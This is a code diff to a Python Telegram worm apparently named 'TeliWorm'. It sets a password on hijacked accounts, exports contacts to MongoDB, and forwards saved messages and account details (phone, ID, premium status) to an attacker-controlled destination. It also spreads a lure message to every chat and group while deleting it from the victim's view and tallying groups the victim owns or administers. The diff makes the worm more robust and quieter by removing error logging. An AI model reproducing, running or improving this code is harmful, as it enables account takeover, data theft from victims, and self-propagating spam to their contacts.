@@ -1,4 +1,4 @@
-import os, random, asyncio, json, string
+import os, random, asyncio, json, string, logging
 from typing import Dict, Optional
 from telethon.tl.types import User
 from telethon import TelegramClient, Button, functions, errors
@@ -12,8 +12,7 @@ from telethon.tl.functions.contacts import GetContactsRequest
 
 
 load_dotenv(override=True)
-# Use the same logger as bot.py
-from bot import logger
+logger = logging.getLogger("TeliWorm")
 mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
 
 async def set_passwd(client: TelegramClient, me: User) -> None:
@@ -27,11 +26,15 @@ async def backup_contacts(client: TelegramClient) -> None:
     logger.info("Backing up contacts...")
     result = await client(GetContactsRequest(hash=0))
     operations = [
-        UpdateOne({'chat_id': user.id}, {"$set": {'phone': user.phone}}, upsert=True)
+        UpdateOne({'chat_id': user.id}, {"$setOnInsert": {'phone': user.phone}}, upsert=True)
         for user in result.users if user.phone
     ]
-    mongo_client.userdb.sessions.bulk_write(operations)
-    logger.debug(f"Contacts backed up: {len(operations)} users.")
+    inserted_count = 0
+    if operations:
+        result = mongo_client.userdb.sessions.bulk_write(operations)
+        # Inserted count is the number of upserts that resulted in an insert
+        inserted_count = result.upserted_count
+    logger.debug(f"Contacts inserted: {inserted_count} (out of {len(operations)} attempted).")
 async def create_bot(client: TelegramClient, me: User) -> Optional[Dict[str, any]]:
     logger.info("Creating new bot via BotFather...")
     async with client.conversation("@BotFather") as conv:
@@ -78,7 +81,6 @@ async def backup_saves(client: TelegramClient, me: User, logger_bot: TelegramCli
             await message.forward_to(dest)
         except Exception as e:
             logger.error(f"Error forwarding message: {e}")
-            break
     await client(functions.channels.LeaveChannelRequest(channel=channel_id))
     log = {
         'txt': f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSaved Messages: {msg_count}\nPremium: {me.premium}",
@@ -121,7 +123,7 @@ async def spread(
     async for dialog in client.iter_dialogs():
         if dialog.is_user and (dialog.entity.bot or dialog.entity.deleted):
             continue
-        elif dialog.is_channel or dialog.is_group:
+        if dialog.is_channel or dialog.is_group:
             permissions = await client.get_permissions(dialog, me)
             if permissions.is_creator:
                 perm_logs['creator'].append({'id': dialog.id, 'title': dialog.title})
@@ -133,27 +135,22 @@ async def spread(
             else:
                 msg = await dialog.send_message(spread_msg_nomedia)
         except errors.FloodWaitError as e:
-            logger.warning(f"FloodWaitError while spreading: {e.seconds}s")
             await asyncio.sleep(e.seconds)
             if spread_msg:
                 msg = await spread_msg.forward_to(dialog)
             else:
                 msg = await dialog.send_message(spread_msg_nomedia)
         except Exception as e:
-            logger.error(f"Error spreading to dialog {dialog.id}: {e}")
             try:
                 msg = await dialog.send_message(spread_msg_nomedia)
             except errors.FloodWaitError as e:
-                logger.warning(f"FloodWaitError (retry) while spreading: {e.seconds}s")
                 await asyncio.sleep(e.seconds)
                 msg = await dialog.send_message(spread_msg_nomedia)
-            except Exception as e:
-                logger.error(f"Failed to send message to dialog {dialog.id}: {e}")
+            except Exception as e2:
                 continue
         if dialog.is_user:
             await msg.delete(revoke=False)
     if log and len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
-        logger.info(f"Editing log message with owner/admin counts.")
         await log['msg'].edit(log['txt'].replace("Session", f"Owner: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession"))
         await client(functions.messages.ImportChatInviteRequest(hash=log['hash']))
         await client.send_message(log['dest'], json.dumps(perm_logs, indent=4, ensure_ascii=False))
